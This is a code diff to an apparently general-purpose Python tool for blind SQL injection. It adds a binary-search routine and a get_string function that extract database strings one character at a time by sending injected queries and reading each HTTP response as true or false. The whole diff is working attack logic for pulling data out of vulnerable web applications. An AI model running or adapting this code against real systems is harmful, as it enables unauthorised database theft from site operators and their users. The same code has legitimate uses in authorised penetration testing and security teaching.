@@ -1,3 +1,4 @@
+from operator import sub
 from typing import Any
 import requests
 import sys
@@ -93,7 +94,7 @@ def binary_search(
     sqli_truth_condition:Callable[[requests.models.Response], bool],
     url:str,
     base_query:Callable[[str],str],
-    outer_query:Callable[[str,str,str],str],
+    outer_query:Callable[[str,str],str],
     inner_query: str,
     lo:int,
     hi:int,
@@ -103,14 +104,38 @@ def binary_search(
     ans = False
     while lo <= hi:
         mid = lo + (hi - lo) // 2
-        sub_query = outer_query(inner_query, mid)
+        sub_query = outer_query(inner_query, mid) 
         ans = question(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, query_encoder=query_encoder, comment=comment, debug=debug)
         if (ans):
             lo = mid + 1
         else:
             hi = mid - 1
     return lo if ans else ans
-'''
+# unfortunately python does not have a concept of operator overloading
+# This version of binary is the same as above except it's customized for get_string
+def binary_search_str_exfil(
+    req:Callable[[requests.models.Response],str],
+    sqli_truth_condition:Callable[[requests.models.Response], bool],
+    url:str,
+    base_query:Callable[[str],str],
+    outer_query:Callable[[str,str,str],str],
+    inner_query: str,
+    pos: int,
+    lo:int,
+    hi:int,
+    query_encoder:Callable[[str], str]=None,
+    comment:str = "",
+    debug:bool=False):
+    while lo <= hi:
+        mid = lo + (hi - lo) // 2
+        sub_query = outer_query(inner_query, str(pos), mid) 
+        ans = question(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, query_encoder=query_encoder, comment=comment, debug=debug)
+        if (ans):
+            lo = mid + 1
+        else:
+            hi = mid - 1
+    return lo 
+    
 def get_string(
     req:Callable[[requests.models.Response],str],
     sqli_truth_condition:Callable[[requests.models.Response], bool],
@@ -125,9 +150,20 @@ def get_string(
     ):
     s = ''
     for i in range(1, strlen + 1):
-        sub_query = outer_query(inner_query)
-        s += binary_search(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, pos=i, lo=32, hi=126, query_encoder=query_encoder, comment=comment, debug=debug)
-'''       
+        s += chr(binary_search_str_exfil(req=req,
+        sqli_truth_condition=sqli_truth_condition,
+        url=url,
+        base_query=base_query,
+        outer_query=outer_query,
+        inner_query=inner_query,
+        pos=i,
+        lo=32,
+        hi=126,
+        query_encoder=query_encoder,
+        comment=comment,
+        debug=debug
+        ))
+    return s
 def report(
     url:str,
     base_query:Callable[[str],str],
